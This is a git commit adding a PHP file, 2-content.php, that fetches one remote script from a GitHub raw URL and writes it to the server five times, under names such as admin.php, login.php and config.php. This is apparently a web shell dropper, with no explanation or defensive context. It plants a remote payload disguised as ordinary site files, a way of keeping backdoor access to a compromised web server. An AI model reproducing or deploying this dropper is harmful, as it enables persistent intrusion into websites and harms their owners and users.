2dfdf25c5b3f54320b9c10758c4aec4c99d79436
zivanaoktora <142502775+zivanaoktora@users.noreply.github.com>
2024-02-27 13:35:18 +0700

    Add files via upload

---
+++ 2-content.php
@@ -0,0 +1,30 @@
+<?php
+$make = fopen('admin.php', 'w+');
+$get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/Alies.php');
+fwrite($make, $get);
+fclose($make);
+?>
+<?php
+$make = fopen('login.php', 'w+');
+$get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/Alies.php');
+fwrite($make, $get);
+fclose($make);
+?>
+<?php
+$make = fopen('config.php', 'w+');
+$get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/Alies.php');
+fwrite($make, $get);
+fclose($make);
+?>
+<?php
+$make = fopen('ini.php', 'w+');
+$get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/Alies.php');
+fwrite($make, $get);
+fclose($make);
+?>
+<?php
+$make = fopen('winjago.php', 'w+');
+$get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/Alies.php');
+fwrite($make, $get);
+fclose($make);
+?>
